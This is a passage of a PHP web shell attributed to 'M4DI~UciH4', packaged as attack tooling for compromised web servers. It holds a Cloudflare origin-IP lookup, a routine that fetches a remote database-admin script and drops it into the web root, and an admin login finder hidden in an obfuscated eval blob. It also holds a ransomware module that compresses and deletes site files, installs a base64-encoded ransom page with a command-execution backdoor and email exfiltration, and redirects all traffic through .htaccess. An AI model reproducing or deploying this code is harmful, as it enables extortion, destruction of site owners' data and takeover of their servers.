O962L/rsnPtafd7YivAVwrdymP9suT/S1+hEzcyMuj78jLiwXPZN7woKJuFFSlCEWCDdcVuXS/bosfyuPLdXgZRnRYyDshKZ+bQXlo2k4ezUrvw53VWWCedlkcVMG+pFzGEsLvP/QDb0jKNLLKzCP0WIiec2yXho2+7UCQpFWyV2vhfgq8EXM9btDYwE1yHuDjJco4xlqDEAuroCffY4bao9WTEgZf8u3iajrZVT5lRN2zcWUyygPw6WVDTDfXw00RzwcfYgcFbMNzIWKfvZDDiUALoLvHWwygwSNYafsmuFrWViarHFoiMWnsRUh24UVX4kJnfDUDHrjmKAOI1ZIZrsnetBuGkbybifV6Znlg93rUTZ5HEzqiiVBPc+vd+TuWSkujhOU76aSUE0ikWYtMLz918LXor96Afi70OyO9dlPSyfb2VOq1Z6lFk35g3DhqyjgovljhZWyPJcXET3HObTHcwPpjdlKfLNENa4pVMXwqC6ysCr42DEYIdKg2dBpKuT4juV9Noq0iFZNlOh0TtdmUVDVSqhottXFa4L8qp6eWxF5DeibLdHomaifoEdTUtDzbVewOsxwP+R8=')));
}
if(isset($_GET['do']) && ($_GET['do'] == 'bypass-cf'))
{	
echo '
<form method="POST"><br>
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma"><--! [ Bypass
<font color="#CC0000">CloudFlare</font> ] !--></font></b></p>
<select class="inputz" name="krz">
	<option>ftp</option>
		<option>direct-conntect</option>
			<option>webmail</option>
				<option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputz" type="submit" value="Bypass"></center><br><br>

';

$target = $_POST['target'];
# Bypass From FTP
if($_POST['krz'] == "ftp") {
$ftp = gethostbyname("ftp."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
} 
# Bypass From Direct-Connect
if($_POST['krz'] == "direct-conntect") {
$direct = gethostbyname("direct-connect."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
}
# Bypass From Webmail
if($_POST['krz'] == "webmail") {
$web = gethostbyname("webmail."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
}
# Bypass From Cpanel
if($_POST['krz'] == "cpanel") {
$cpanel = gethostbyname("cpanel."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
}
}
if($_GET['do'] == 'adminer') {
$source = "https://raw.githubusercontent.com/RahmadiMadi/Adminer/main/adminer.php";
$name = "adminer.php";

function _doEvil($name, $file) {
	$filename = $name;
	$getFile = file_get_contents($file);
	$rootPath = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR;
	$toRootFopen = fopen("$rootPath/$filename",'w');
	$toRootExec = fwrite($toRootFopen, $getFile);
	$rootShellUrl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]"."/$filename";
	$realPath = getcwd().DIRECTORY_SEPARATOR;
	$toRealFopen = fopen("$realPath/$filename",'w');
	$toRealExec = fwrite($toRealFopen, $getFile);
	$realShellUrl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]".dirname($_SERVER[REQUEST_URI])."/$filename";
	echo "<center>";
	if($toRootExec) {
		if(file_exists($rootPath."$filename")) {
			echo "<h1><font color='lime'>[OK!] <a href=\"adminer.php\" target=\"_blank\">Click Here Bitch</a></font></h1>";
		}
		else { 
			echo "<h1><font color='red'>$rootPath$filename<br>Doesn't exist!</font>Try with another method!</h1>";
		}
	}
	else {
		if($toRealExec) {
			if(file_exists($realPath."$filename")) {
				echo "<h1><font color='lime'>[OK!] <a href=\"$realShellUrl\" target=\"_blank\">$realShellUrl</a></font></h1>";
			}
			else { 
				echo "<h1><font color='red'>FAILED!</font></h1>";
			}
		}
	}
	echo "</center>";
}
_doEvil($name, $source);
}
if(isset($_GET['do']) && ($_GET['do'] == 'adlog')) {
eval(gzinflate(base64_decode('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')));
?>
<center>
<h1>Admin Login Finder</h1>
<form method="POST" action="<?php $PHP_SELF; ?>">
<font color="white">Masukin Web Nya Sayang :</font>
<input class="inputz" type="text" name="url" value="xnxx.com"/>
<input class="inputz" type="submit" name="submit" value="Gas Keun Amjinc"/>
</p>
<br>
<br>
<font color="red" size="6">Copyright©2020</font><br>
<font color="red" size="6">M4DI~UciH4</font>
<?php
}
//change email@gmail.com with your mail
if(isset($_GET['do']) && ($_GET['do'] == 'ransom2')) {
 error_reporting(0);set_time_limit(0);ini_set('memory_limit','-1');if(isset($_POST['pass'])){function encfile($filename){if(strpos($filename,'.M4DI~UciH4') !== false){return ;}file_put_contents($filename.".M4DI~UciH4",gzdeflate(file_get_contents($filename),9));unlink($filename);copy('.htaccess','.htabackup');$file=base64_decode("PHRpdGxlPk00REl+VWNpSDQgfHwgUmFuc29td2FyZTwvdGl0bGU+DQo8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9mcmVlcG5naW1nLmNvbS90aHVtYi9wYWRsb2NrLzEwLTItcGFkbG9jay1oaWdoLXF1YWxpdHktcG5nLnBuZyI+DQo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9QWxhZGluJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NCjxsaW5rIGhyZWY9Imh0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUZyZWRlcmlja2ErdGhlK0dyZWF0IiByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIj4NCjxsaW5rIGhyZWY9J2h0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PU9yYml0cm9uOjcwMCcgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+DQo8c3R5bGU+DQppbnB1dCB7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBjb2xvcjogd2hpdGU7IGJvcmRlcjogMXB4IHNvbGlkIHdoaXRlOyB9DQo8L3N0eWxlPg0KPD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRpbnB1dCA9ICRfUE9TVFsncGFzcyddOw0KJHBhc3MgPSAiamFuY29ramFyYW4iOw0KaWYoaXNzZXQoJGlucHV0KSkgew0KaWYobWQ1KCRpbnB1dCkgPT0gJHBhc3MpIHsNCmZ1bmN0aW9uIGRlY2ZpbGUoJGZpbGVuYW1lKXsNCglpZiAoc3RycG9zKCRmaWxlbmFtZSwgJy5NNERJflVjaUg0JykgPT09IEZBTFNFKSB7DQoJcmV0dXJuOw0KCX0NCgkkZGVjcnlwdGVkID0gZ3ppbmZsYXRlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlbmFtZSkpOw0KCWZpbGVfcHV0X2NvbnRlbnRzKHN0cl9yZXBsYWNlKCcuTTRESX5VY2lINCcsICcnLCAkZmlsZW5hbWUpLCAkZGVjcnlwdGVkKTsNCgl1bmxpbmsoJ200ZDEucGhwJyk7DQoJdW5saW5rKCcuaHRhY2Nlc3MnKTsNCgl1bmxpbmsoJGZpbGVuYW1lKTsNCgllY2hvICIkZmlsZW5hbWUgRGVjcnlwdGVkICEhITxicj4iOw0KfQ0KDQpmdW5jdGlvbiBkZWNkaXIoJGRpcil7DQoJJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRkaXIpLCBhcnJheSgnLicsICcuLicpKTsNCgkJZm9yZWFjaCgkZmlsZXMgYXMgJGZpbGUpIHsNCgkJCWlmKGlzX2RpcigkZGlyLiIvIi4kZmlsZSkpew0KCQkJCWRlY2RpcigkZGlyLiIvIi4kZmlsZSk7DQoJCQl9ZWxzZSB7DQoJCQkJZGVjZmlsZSgkZGlyLiIvIi4kZmlsZSk7DQoJCX0NCgl9DQp9DQoNCmRlY2RpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsNCmVjaG8gIjxicj5XZWJyb290IERlY3J5cHRlZDxicj4iOw0KdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsNCnVubGluaygnLmh0YWNjZXNzJyk7DQpjb3B5KCdodGFiYWNrdXAnLCcuaHRhY2Nlc3MnKTsNCmVjaG8gJ1N1Y2Nlc3MgISEhJzsNCn0gZWxzZSB7DQplY2hvICdGYWlsZWQgUGFzc3dvcmQgISEhJzsNCn0NCmV4aXQoKTsNCn0NCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sPg0KPGhlYWQ+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KYm9keSB7DQogICAgYmFja2dyb3VuZDogIzFBMUMxRjsNCiAgICBjb2xvcjogI2UyZTJlMjsNCn0NCmF7DQogICBjb2xvcjpncmVlbjsNCn0NCmEudHlwZTE6bGluayB7IGNvbG9yOmJsYWNrO3RleHQtZGVjb3JhdGlvbjogbm9uZTt9DQphLnR5cGUxOnZpc2l0ZWQgeyBjb2xvcjpncmV5OyB9DQphLnR5cGUxOmhvdmVyIHsgDQogLXdlYmtpdC1iYWNrZ3JvdW5kLWNsaXA6IHRleHQ7DQogY29sb3I6IHdoaXRlOw0KIC13ZWJraXQtdGV4dC1maWxsLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgIGJhY2tncm91bmQtaW1hZ2U6IC13ZWJraXQtZ3JhZGllbnQobGluZWFyLCBsZWZ0IHRvcCwgcmlnaHQgdG9wLCBmcm9tKCNlYTg3MTEpLCB0bygjZDk2MzYzKSk7DQogYmFja2dyb3VuZC1pbWFnZTogLXdlYmtpdC1saW5lYXItZ3JhZGllbnQobGVmdCwgI2VhODcxMSwgI2Q5NjM2MywgIzczYTZkZiwgIzkwODVmYiwgIzUyY2E3OSk7IA0KIGJhY2tncm91bmQtaW1hZ2U6ICAgIC1tb3otbGluZWFyLWdyYWRpZW50KGxlZnQsICNlYTg3MTEsICNkOTYzNjMsICM3M2E2ZGYsICM5MDg1ZmIsICM1MmNhNzkpOw0KIGJhY2tncm91bmQtaW1hZ2U6ICAgICAtbXMtbGluZWFyLWdyYWRpZW50KGxlZnQsICNlYTg3MTEsICNkOTYzNjMsICM3M2E2ZGYsICM5MDg1ZmIsICM1MmNhNzkpOyANCiBiYWNrZ3JvdW5kLWltYWdlOiAgICAgIC1vLWxpbmVhci1ncmFkaWVudChsZWZ0LCAjZWE4NzExLCAjZDk2MzYzLCAjNzNhNmRmLCAjOTA4NWZiLCAjNTJjYTc5KTsNCiB9DQogLmltZyB7DQoJZm9udC1zaXplOiA3cHg7DQoJfQ0KaDF7DQogICAgZm9udC1mYW1pbHk6IE9yYml0cm9uOw0KICAgIGZvbnQtc2l6ZTogMjBweDsNCiAgICBjb2xvcjogIzFhYmM5YzsNCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCgk8P3BocA0KJGVtbCA9ICdpbmRvbWlsazg3QGdtYWlsLmNvbSxzeWFocmluaXNheWFuZ0BnbWFpbC5jb20sbWF1bGlkYXpoYTU4N0BnbWFpbC5jb20nOw0KJGpkbCA9ICdJbmZvcm1hc2kgVXBsb2FkZXIgUmFuc29td2FyZSc7DQokbXNnID0gIlVwbG9hZCBGaWxlcyAgOiAiLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiIvIi4kX0ZJTEVTWydqdXN0X2ZpbGUnXVsnbmFtZSddLiJuIi4iWW91ciBBY2NwdCAgICA6ICIuJF9TRVJWRVJbJ0hUVFBfQUNDRVBUJ10uIm49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PW4iLiJJUCBBZGRyZXNzICAgICA6ICIuJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10uIm4iLiJVc2VyIEFnZW50ICAgICA6ICIuJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KDQoJIGlmKGlzc2V0KCRfR0VUWyJ1cCJdKSkNCiB7DQplY2hvICI8Y2VudGVyPjxicj4iOw0KZWNobyAiPGI+PGJyPiI7DQplY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPg0KCSAgPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2p1c3RfZmlsZSc+DQoJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSdHYXNwb2whJz4NCgkgIDwvZm9ybT4NCgkgIDwvY2VudGVyPiI7DQokcm9vdCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107DQokZmlsZXMgPSAkX0ZJTEVTWydqdXN0X2ZpbGUnXVsnbmFtZSddOw0KJGRlc3QgPSAkcm9vdC4nLycuJGZpbGVzOw0KaWYoaXNzZXQoJF9QT1NUWyd1cGxvYWQnXSkpIHsNCglpZihpc193cml0YWJsZSgkcm9vdCkpIHsNCgkJaWYoQGNvcHkoJF9GSUxFU1snanVzdF9maWxlJ11bJ3RtcF9uYW1lJ10sICRkZXN0KSkNCmlmKG1haWwoJGVtbCwkamRsLCRtc2cpKSB7DQoJCQkkd2ViID0gImh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iLyI7DQoJCQllY2hvICI8YnI+PGZvbnQgY29sb3I9Z3JlZW4+VXBsb2FkIFN1a3NlczwvZm9udD4gLS0+IDxmb250IGNvbG9yPXJlZD48YSBocmVmPSckd2ViJGZpbGVzJyB0YXJnZXQ9J19ibGFuayc+PGI+PHU+JHdlYi8kZmlsZXM8L3U+PC9iPjwvYT48L2ZvbnQ+IjsNCgkJfSBlbHNlIHsNCgkJCWVjaG8gIjxmb250IGNvbG9yPXJlZD5HYWdhbCBVcGxvYWQgRGkgRG9jdW1lbnQgUm9vdDwvZm9udD4iOw0KCQl9DQoJfSBlbHNlIHsNCgkJaWYoQGNvcHkoJF9GSUxFU1snanVzdF9maWxlJ11bJ3RtcF9uYW1lJ10sICRmaWxlcykpIHsNCgkJCWVjaG8gIiBVcGxvYWQgPGI+JGZpbGVzPC9iPiBEaSBGb2xkZXIgSW5pIjsNCgkJfSBlbHNlIHsNCgkJCWVjaG8gIjxmb250IGNvbG9yPXJlZD5VcGxvYWQgRmFpbGVkPC9mb250PiI7DQoJCX0NCgl9DQp9DQp9DQo/Pg0KPGNlbnRlcj4NCjxwcmU+DQo8P3BocCBlY2hvIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg0KPGZvbnQgY2xhc3M9ImltZyIgY29sb3I9InJlZCI+DQogICAgICAgICAgICAgICAgICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2ICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICDCtsK2wrbCtsK2wrYgICAgICAgICAgICAgwrbCtsK2wrbCtsK2wrYgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgIMK2wrbCtsK2ICAgICAgICAgICAgICAgICAgICAgICDCtsK2wrbCtiAgICAgICAgICAgICAgDQogICAgICAgICAgICAgwrbCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICAgICAgICAgICAgDQogICAgICAgICAgICDCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICAgICAgICAgICANCiAgICAgICAgICAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgICAgICAgICAgDQogICAgICAgICAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgICAgICAgICANCiAgICAgICAgICDCtsK2IMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgwrbCtiAgICAgICAgICANCiAgICAgICAgICDCtsK2IMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgIMK2ICAgICAgICAgIA0KICAgICAgICAgIMK2wrYgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgwrYgICAgICAgICAgDQogICAgICAgICAgwrbCtiAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2IMK2wrYgICAgICAgICAgDQogICAgICAgICAgwrbCtiAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgIMK2wrYgICAgICAgICAgDQogICAgICAgICAgIMK2wrYgwrbCtiAgIMK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrbCtsK2wrYgICDCtsK2IMK2wrYgICAgICAgICAgIA0KICAgICAgICAgICAgwrbCtsK2wrYgwrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2IMK2wrbCtsK2wrYgICAgICAgICAgIA0KICAgICAgICAgICAgIMK2wrbCtiDCtsK2wrbCtsK2wrbCtsK2wrbCtiAgICAgwrbCtsK2wrbCtsK2wrbCtsK2wrYgwrbCtsK2ICAgICAgICAgICAgIA0KICAgIMK2wrbCtiAgICAgICDCtsK2ICDCtsK2wrbCtsK2wrbCtsK2ICAgICAgIMK2wrbCtsK2wrbCtsK2wrbCtiAgwrbCtiAgICAgIMK2wrbCtsK2ICAgDQogICDCtsK2wrbCtsK2ICAgICDCtsK2ICAgwrbCtsK2wrbCtsK2wrYgICDCtsK2wrYgICDCtsK2wrbCtsK2wrbCtiAgIMK2wrYgICAgIMK2wrbCtsK2wrbCtiAgDQogIMK2wrYgICDCtsK2ICAgIMK2wrYgICAgIMK2wrbCtiAgICDCtsK2wrbCtsK2ICAgIMK2wrbCtiAgICAgwrbCtiAgICDCtsK2ICAgwrbCtiAgDQogwrbCtsK2ICAgIMK2wrbCtsK2ICDCtsK2ICAgICAgICAgIMK2wrbCtsK2wrbCtsK2ICAgICAgICAgIMK2wrYgIMK2wrbCtsK2ICAgIMK2wrbCtiANCsK2wrYgICAgICAgICDCtsK2wrbCtsK2wrbCtsK2ICAgICAgIMK2wrbCtsK2wrbCtsK2ICAgICAgIMK2wrbCtsK2wrbCtsK2wrbCtiAgICAgICAgwrbCtg0KwrbCtsK2wrbCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2ICAgIMK2wrbCtsK2wrbCtsK2ICAgIMK2wrbCtsK2wrbCtsK2wrYgICAgICDCtsK2wrbCtsK2wrbCtsK2DQogIMK2wrbCtsK2IMK2wrbCtsK2wrYgICAgICDCtsK2wrbCtsK2ICAgICAgICAgICAgICDCtsK2wrYgwrbCtiAgICAgwrbCtsK2wrbCtsK2IMK2wrbCtiANCiAgICAgICAgICDCtsK2wrbCtsK2wrYgIMK2wrbCtiAgwrbCtiAgICAgICAgICAgwrbCtiAgwrbCtsK2ICDCtsK2wrbCtsK2wrYgICAgICAgIA0KICAgICAgICAgICAgICDCtsK2wrbCtsK2wrYgwrbCtiDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2IMK2wrYgwrbCtsK2wrbCtsK2ICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgIMK2wrYgwrbCtiDCtiDCtiDCtiDCtiDCtiDCtiDCtiDCtiDCtsK2ICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICDCtsK2wrbCtiAgwrYgwrYgwrYgwrYgwrYgwrYgwrYgwrYgICDCtsK2wrbCtsK2ICAgICAgICAgICAgICANCiAgICAgICAgICAgIMK2wrbCtsK2wrYgwrbCtiAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2ICAgwrbCtiDCtsK2wrbCtsK2ICAgICAgICAgICAgDQogICAgwrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrYgICAgICAgICAgICAgICAgIMK2wrYgICAgICDCtsK2wrbCtsK2wrbCtsK2wrYgICAgDQogICDCtsK2ICAgICAgICAgICDCtsK2wrbCtsK2wrbCtiAgICAgICAgICAgICDCtsK2wrbCtsK2wrbCtsK2ICAgICAgICAgIMK2wrYgICANCiAgICDCtsK2wrYgICAgIMK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtiAgICAgwrbCtsK2wrbCtiAgICAgwrbCtsK2ICAgIA0KICAgICAgwrbCtiAgIMK2wrbCtiAgICAgICAgICAgwrbCtsK2wrbCtsK2wrbCtsK2ICAgICAgICAgICDCtsK2wrYgICDCtsK2ICAgICAgDQogICAgICDCtsK2ICDCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICDCtsK2ICAgICAgDQogICAgICAgwrbCtsK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtsK2wrYgICAgICAgDQo8L2ZvbnQ+DQo8aDE+ICANCllvdXIgc2l0ZSBpcyBsb2NrZWQgYnkgdGhlIGN1c3RvbSByYW5zb213YXJlIGVuY3J5cHRpb24gbWV0aG9kDQpQbGVhc2UgcGF5IDxmb250IGNvbG9yPSJnb2xkIj4kMzwvZm9udD4gdG8gPGEgY2xhc3M9InR5cGUxIiBocmVmPSJwYXlwYWwiPjxmb250IGNvbG9yPSJyZWQiPnBheXBhbDwvZm9udD48L2E+IHRvIHJlc3RvcmUgeW91ciB3ZWJzaXRlIHRoYXQgaXMgbG9ja2VkDQpPciB3aXRoaW4gMjQgaG91cnMgYWxsIHlvdXIgZmlsZXMgb24gdGhpcyB3ZWJzaXRlIHdpbGwgYmUgZGVsZXRlZCA8L2g+DQo8Zm9udCBjb2xvcj0id2hpdGUiPi1bIDwvZm9udD48YSBjbGFzcz0idHlwZTEiIGhyZWY9Im1haWx0bzppbmRvbWlsazg3QGdtYWlsLmNvbSI+PGZvbnQgY29sb3I9ImdyZWVuIj5pbmRvbWlsazg3QGdtYWlsLmNvbTwvZm9udD48L2E+IDxmb250IGNvbG9yPSJ3aGl0ZSI+XS08L2ZvbnQ+DQo8Zm9udCBjb2xvcj0iZ29sZCI+PDwvZm9udD48Zm9udCBjb2xvcj0icmVkIj4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTwvZm9udD48Zm9udCBjb2xvcj0iZ29sZCI+PjwvZm9udD4NClRoaXMgaXMgYSBub3RpY2Ugb2YgPGEgY2xhc3M9InR5cGUxIiBocmVmPSJodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9SYW5zb213YXJlIj48Zm9udCBjb2xvcj0iZ3JlZW4iPnJhbnNvbXdhcmU8L2ZvbnQ+PC9hPjxicj4NCkhvdyB0byByZXN0b3JlIHRoZSBiZWdpbm5pbmc/DQpQbGVhc2UgY29udGFjdCB1cyB2aWEgZW1haWwgbGlzdGVkDQo8L2gxPg0KPC9wcmU+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4NCjxicj48YnI+DQoJPGNlbnRlcj48Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPg0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3MiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCI+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJEZWNyeXB0Ij4NCjwvZm9ybT48aWZyYW1lIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIHNyYz0iIyIgZnJhbWVib3JkZXI9IjAiIGFsbG93ZnVsbHNjcmVlbj48L2lmcmFtZT48L2NlbnRlcj4NCjxicj4=");$q=str_replace('jancokjaran',md5($_POST['pass']),$file);$w=str_replace('indomilk87@gmail.com',$_POST['email'],$q);$e=str_replace('paypal',$_POST['paypal'],$w);$r=str_replace('$3','$'.$_POST['price'],$e);$dec=$r;$comp="<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";$cok=fopen('m4d1.php','w');fwrite($cok,$comp);fclose($cok);$hta="DirectoryIndex m4d1.php\n
ErrorDocument 403 /m4d1.php\n
ErrorDocument 404 /m4d1.php\n
ErrorDocument 500 /m4d1.php\n";
